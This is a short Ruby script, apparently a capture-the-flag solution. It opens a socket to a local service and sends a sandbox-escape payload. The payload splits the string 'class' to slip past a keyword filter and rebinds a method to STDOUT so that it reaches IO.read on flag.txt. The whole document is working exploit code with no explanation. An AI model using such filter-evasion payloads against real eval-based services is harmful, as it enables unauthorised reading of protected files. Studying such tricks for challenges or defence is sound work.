#!/usr/bin/env ruby

require 'socket'

TCPSocket.open('127.0.0.1', 6767) do |s|
	s.puts('Object.instance_method("cla" + "ss").bind(STDOUT).call.read("flag.txt")')
	puts s.gets
end
